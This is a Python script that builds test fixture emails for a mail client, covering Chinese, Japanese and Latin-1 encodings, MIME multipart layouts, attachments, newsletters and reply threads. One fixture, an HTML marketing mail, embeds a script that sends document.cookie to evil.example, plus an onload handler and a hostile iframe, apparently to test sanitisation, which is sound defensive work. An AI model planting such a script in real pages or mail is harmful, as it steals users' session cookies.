"""Generates the fixture emails for steve-mail. Output is committed; rerun with: python3 -I gen.py <this dir>."""
import base64, quopri, sys, os, zlib, struct
from email.header import Header

out = sys.argv[1]
os.makedirs(out, exist_ok=True)


def b(word, charset="utf-8"):
    label = {"iso2022_jp": "ISO-2022-JP"}.get(charset, charset.upper())
    return "=?%s?B?%s?=" % (label, base64.b64encode(word.encode(charset)).decode())


def b64lines(data):
    s = base64.b64encode(data).decode()
    return "\r\n".join(s[i:i + 76] for i in range(0, len(s), 76))


def qp(text, charset="utf-8"):
    return quopri.encodestring(text.encode(charset)).decode().replace("\n", "\r\n")


def write(name, parts):
    data = b"".join(p if isinstance(p, bytes) else p.replace("\r\n", "\n").replace("\n", "\r\n").encode("ascii") for p in parts)
    with open(os.path.join(out, name), "wb") as f:
        f.write(data)


def png():
    raw = b"\x00\xff\x00\x00"  # one red pixel, filter byte + RGB
    def chunk(t, d):
        return struct.pack(">I", len(d)) + t + d + struct.pack(">I", zlib.crc32(t + d) & 0xffffffff)
    return b"\x89PNG\r\n\x1a\n" + chunk(b"IHDR", struct.pack(">IIBBBBB", 1, 1, 8, 2, 0, 0, 0)) + chunk(b"IDAT", zlib.compress(raw)) + chunk(b"IEND", b"")


def pdf():
    body = b"%PDF-1.4\n1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj\n2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj\n3 0 obj<</Type/Page/Parent 2 0 R/MediaBox[0 0 200 100]>>endobj\ntrailer<</Root 1 0 R>>\n%%EOF\n"
    return body


# 1. multipart/alternative, Chinese RFC 2047 subject split over two encoded words, encoded display names
write("multipart-alternative.eml", ["""Return-Path: <wang.xiaoming@acme.example>
Received: from mx.acme.example (mx.acme.example [192.0.2.10])
\tby mx.example.com with ESMTPS id 4XyZ; Mon, 26 Oct 2026 09:12:03 +0800
Date: Mon, 26 Oct 2026 09:12:00 +0800
From: %s <wang.xiaoming@acme.example>
To: %s <me@example.com>
Cc: "Li, Na" <li.na@acme.example>
Subject: %s
 %s
Message-ID: <CAF0alt.20261026.0912@acme.example>
MIME-Version: 1.0
Content-Type: multipart/alternative; boundary="=_alt_7f3a"

This is a multi-part message in MIME format.

--=_alt_7f3a
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable

%s
--=_alt_7f3a
Content-Type: text/html; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable

%s
--=_alt_7f3a--
""" % (b("王小明"), b("我"), b("关于下周三的会议"), b("改期到周四下午"),
       qp("你好，\n\n原定下周三（11 月 4 日）的评审会改到周四下午 3 点，地点不变。\n如果周四不方便请告诉我。\n\n王小明 · Acme 产品部\n电话：010-5555-0100\n"),
       qp('<html><body><p>你好，</p><p>原定下周三（11&nbsp;月&nbsp;4&nbsp;日）的评审会改到<b>周四下午 3 点</b>，地点不变。</p><p>如果周四不方便请告诉我。</p><p>王小明 · Acme 产品部<br>电话：010-5555-0100</p></body></html>\n'))])

# 2. HTML-only marketing-ish mail with tracking pixel, remote images, script and inline handlers; ISO-8859-1 Q-encoded subject
html = """<!DOCTYPE html>
<html><head><meta charset="iso-8859-1">
<link rel="stylesheet" href="https://cdn.shop.example/mail.css">
<script>document.location='https://evil.example/steal?c='+document.cookie</script>
<style>p{font-family:Arial}</style></head>
<body onload="alert('x')">
<p>Bonjour, votre commande au Caf\xe9 de la Gare est confirm\xe9e.</p>
<p><img src="https://img.shop.example/banner.jpg" alt="Banni\xe8re"></p>
<p><a href="https://click.shop.example/r?u=abc123&amp;l=1" onclick="track()">Voir la commande</a></p>
<iframe src="https://evil.example/frame"></iframe>
<img src="https://track.shop.example/open.gif?u=abc123" width="1" height="1" style="display:none" alt="">
</body></html>
"""
write("html-tracking.eml", ["""Date: Tue, 27 Oct 2026 18:40:00 +0100
From: =?ISO-8859-1?Q?Caf=E9_de_la_Gare?= <orders@shop.example>
To: me@example.com
Subject: =?ISO-8859-1?Q?Votre_commande_est_confirm=E9e_=E0_la_caisse?=
Message-ID: <order-88231.1761586800@shop.example>
MIME-Version: 1.0
Content-Type: text/html; charset=ISO-8859-1
Content-Transfer-Encoding: quoted-printable

""", quopri.encodestring(html.encode("latin-1")).replace(b"\n", b"\r\n")])

# 3. GBK: GB2312-encoded From name, GBK subject, raw 8bit GBK body
gbk_body = "李总您好：\n\n附件里的报价单已经按昨天电话里说的改好了，单价下调 5%，交货期 30 天。\n请您过目，有问题随时联系。\n\n张伟\n华东销售部 | 区域经理\n"
write("gbk.eml", ["""Date: Wed, 28 Oct 2026 10:05:00 +0800
From: %s <zhang.wei@huadong.example.cn>
To: me@example.com
Subject: %s
Message-ID: <20261028100500.GBK0001@huadong.example.cn>
MIME-Version: 1.0
Content-Type: text/plain; charset="gbk"
Content-Transfer-Encoding: 8bit
X-Mailer: Foxmail 7.2

""" % (b("张伟", "gb2312"), b("回复：报价单（修改版）", "gbk")), gbk_body.replace("\n", "\r\n").encode("gbk")])

# 4. GB18030 with a character outside GBK (U+4DAE), base64 body
gb_text = "会议纪要：\n1. 龑䶮项目延期一周。\n2. 预算不变。\n"
write("gb18030.eml", ["""Date: Wed, 28 Oct 2026 16:20:00 +0800
From: =?GB18030?B?%s?= <minutes@corp.example.cn>
To: me@example.com
Subject: %s
Message-ID: <gb18030-minutes-1028@corp.example.cn>
MIME-Version: 1.0
Content-Type: text/plain; charset=GB18030
Content-Transfer-Encoding: base64

%s
""" % (base64.b64encode("会议秘书".encode("gb18030")).decode(), b("会议纪要 䶮", "gb18030"), b64lines(gb_text.replace("\n", "\r\n").encode("gb18030")))])

# 5. Big5 traditional Chinese, quoted-printable body
big5_text = "您好：\n\n本週五的課程改在三樓會議室，請準時出席。\n\n台北辦公室 敬上\n"
write("big5.eml", ["""Date: Thu, 29 Oct 2026 08:30:00 +0800
From: %s <office@tw.example.com.tw>
To: me@example.com
Subject: %s
Message-ID: <big5-notice-1029@tw.example.com.tw>
MIME-Version: 1.0
Content-Type: text/plain; charset=big5
Content-Transfer-Encoding: quoted-printable

""" % (b("台北辦公室", "big5"), b("課程地點變更", "big5")), quopri.encodestring(big5_text.encode("big5")).replace(b"\n", b"\r\n")])

# 6. ISO-2022-JP, 7bit body as Japanese mailers still send
jp_text = "山田です。\n\n来週の打ち合わせ資料をお送りします。\nよろしくお願いいたします。\n"
write("iso-2022-jp.eml", ["""Date: Thu, 29 Oct 2026 11:00:00 +0900
From: %s <yamada@jp.example.co.jp>
To: me@example.com
Subject: %s
Message-ID: <jp-0001.1029@jp.example.co.jp>
MIME-Version: 1.0
Content-Type: text/plain; charset=ISO-2022-JP
Content-Transfer-Encoding: 7bit

""" % (b("山田太郎", "iso2022_jp"), b("打ち合わせ資料の送付", "iso2022_jp")), jp_text.replace("\n", "\r\n").encode("iso2022_jp")])

# 7. Invoice with PDF attachment, RFC 2231 encoded Chinese filename
write("invoice-pdf.eml", ["""Date: Fri, 30 Oct 2026 14:00:00 +0800
From: =?UTF-8?B?%s?= <billing@cloudhost.example>
To: me@example.com
Subject: %s
Message-ID: <inv-2026-10-000731@billing.cloudhost.example>
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="----=_Part_731_1761804000"

------=_Part_731_1761804000
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: base64

%s
------=_Part_731_1761804000
Content-Type: application/pdf; name="=?UTF-8?B?%s?="
Content-Transfer-Encoding: base64
Content-Disposition: attachment; filename*=UTF-8''%s

%s
------=_Part_731_1761804000--
""" % (base64.b64encode("云主机账单".encode()).decode(), b("您的 2026 年 10 月账单（INV-2026-10-000731）"),
       b64lines("尊敬的用户：\n\n您 2026 年 10 月的账单已生成。\n账单号：INV-2026-10-000731\n金额：¥ 1,286.40\n付款截止：2026-11-15\n\n发票见附件。\n".replace("\n", "\r\n").encode()),
       base64.b64encode("发票-2026-10.pdf".encode()).decode(),
       "".join("%%%02X" % c for c in "发票-2026-10.pdf".encode()), b64lines(pdf()))])

# 8. multipart/related with an inline cid: image
write("inline-cid.eml", ["""Date: Fri, 30 Oct 2026 09:00:00 +0000
From: Acme Design <design@acme.example>
To: me@example.com
Subject: New logo draft
Message-ID: <logo-draft-3@acme.example>
MIME-Version: 1.0
Content-Type: multipart/related; boundary="rel-b1"; type="text/html"

--rel-b1
Content-Type: text/html; charset=utf-8
Content-Transfer-Encoding: 7bit

<html><body><p>Here is the new logo:</p><p><img src="cid:logo@acme.example" alt="logo"></p></body></html>
--rel-b1
Content-Type: image/png; name="logo.png"
Content-Transfer-Encoding: base64
Content-ID: <logo@acme.example>
Content-Disposition: inline; filename="logo.png"

%s
--rel-b1--
""" % b64lines(png())])

# 9. Newsletter: List-Unsubscribe (+ one-click), List-Id, Precedence bulk, tracking pixel
write("newsletter.eml", ["""Date: Sat, 31 Oct 2026 07:00:00 +0000
From: Rust Weekly <newsletter@rustweekly.example>
To: me@example.com
Subject: This Week in Rust 670
Message-ID: <twir-670.20261031@mailer.rustweekly.example>
List-Id: Rust Weekly <weekly.rustweekly.example>
List-Unsubscribe: <mailto:unsubscribe@rustweekly.example?subject=unsubscribe>, <https://rustweekly.example/u/abc123>
List-Unsubscribe-Post: List-Unsubscribe=One-Click
Precedence: bulk
Auto-Submitted: auto-generated
Feedback-ID: 670:weekly:rustweekly
MIME-Version: 1.0
Content-Type: multipart/alternative; boundary="nl-b"

--nl-b
Content-Type: text/plain; charset=utf-8
Content-Transfer-Encoding: 7bit

This Week in Rust 670

* Rust 1.99 released
* async closures everywhere

Unsubscribe: https://rustweekly.example/u/abc123
--nl-b
Content-Type: text/html; charset=utf-8
Content-Transfer-Encoding: 7bit

<html><body><h1>This Week in Rust 670</h1><ul><li>Rust 1.99 released</li><li>async closures everywhere</li></ul>
<p><a href="https://rustweekly.example/u/abc123">Unsubscribe</a></p>
<img src="https://rustweekly.example/o/abc123.gif" width="1" height="1"></body></html>
--nl-b--
"""])

# 10. Outlook-style reply: top posting, separator line and From:/Sent:/To:/Subject: block
write("outlook-quote.eml", ["""Date: Sat, 31 Oct 2026 10:15:00 +0800
From: Chen Jie <chen.jie@partner.example>
To: me@example.com
Subject: RE: Q4 contract renewal
Thread-Topic: Q4 contract renewal
Thread-Index: AdtLm0a7b2ZpQ3NVRk2xYz==
Message-ID: <SN6PR02MB1234ABCD@SN6PR02MB1234.namprd02.prod.outlook.example>
In-Reply-To: <q4-renewal-1@example.com>
References: <q4-renewal-1@example.com>
MIME-Version: 1.0
Content-Type: text/plain; charset="utf-8"
Content-Transfer-Encoding: 8bit
X-MS-Has-Attach:
X-MS-TNEF-Correlator:

""", ("""Thanks, the new terms look fine. Legal will send the signed copy on Monday.

Chen Jie | Procurement Lead
Partner Co.

________________________________
From: Me <me@example.com>
Sent: Friday, October 30, 2026 5:02 PM
To: Chen Jie <chen.jie@partner.example>
Subject: Q4 contract renewal

Hi Chen,

Attached are the renewal terms for Q4. Please review.
""").replace("\n", "\r\n").encode()])

# 11-13. Reply chain of three: Alice -> me, me -> Alice, Alice -> me (References accumulate)
write("thread-1.eml", ["""Date: Mon, 26 Oct 2026 08:00:00 +0000
From: Alice Zhou <alice@acme.example>
To: me@example.com
Subject: =?UTF-8?B?%s?=
Message-ID: <thread-1.alice@acme.example>
MIME-Version: 1.0
Content-Type: text/plain; charset=utf-8
Content-Transfer-Encoding: 8bit

""" % base64.b64encode("预算审批流程".encode()).decode(), "你好，预算审批要走哪几步？下周之前要提交。\r\n\r\nAlice\r\n".encode()])
write("thread-2.eml", ["""Date: Mon, 26 Oct 2026 09:30:00 +0000
From: Me <me@example.com>
To: Alice Zhou <alice@acme.example>
Subject: =?UTF-8?B?%s?=
Message-ID: <thread-2.me@example.com>
In-Reply-To: <thread-1.alice@acme.example>
References: <thread-1.alice@acme.example>
MIME-Version: 1.0
Content-Type: text/plain; charset=utf-8
Content-Transfer-Encoding: 8bit

""" % base64.b64encode("Re: 预算审批流程".encode()).decode(), "三步：部门负责人、财务、CFO。表格我稍后发你。\r\n\r\nOn Mon, Oct 26, 2026 at 8:00 AM Alice Zhou <alice@acme.example> wrote:\r\n> 你好，预算审批要走哪几步？下周之前要提交。\r\n>\r\n> Alice\r\n".encode()])
write("thread-3.eml", ["""Date: Mon, 26 Oct 2026 11:45:00 +0000
From: Alice Zhou <alice@acme.example>
To: me@example.com
Cc: Bob Liu <bob@acme.example>
Subject: =?UTF-8?B?%s?=
Message-ID: <thread-3.alice@acme.example>
In-Reply-To: <thread-2.me@example.com>
References: <thread-1.alice@acme.example>
 <thread-2.me@example.com>
MIME-Version: 1.0
Content-Type: text/plain; charset=utf-8
Content-Transfer-Encoding: 8bit

""" % base64.b64encode("Re: 预算审批流程".encode()).decode(), "收到，谢谢！我抄送了 Bob，他负责填表。\r\n\r\n在 2026年10月26日 周一 17:30，Me <me@example.com> 写道：\r\n> 三步：部门负责人、财务、CFO。表格我稍后发你。\r\n".encode()])

# 14. No Message-ID (some ticketing systems and old scripts)
write("no-message-id.eml", ["""Date: Sun, 01 Nov 2026 03:00:00 +0000
From: cron@build.example
To: me@example.com
Subject: [cron] nightly backup finished

Backup finished in 312 s, 14.2 GB written.
"""])

print("ok")
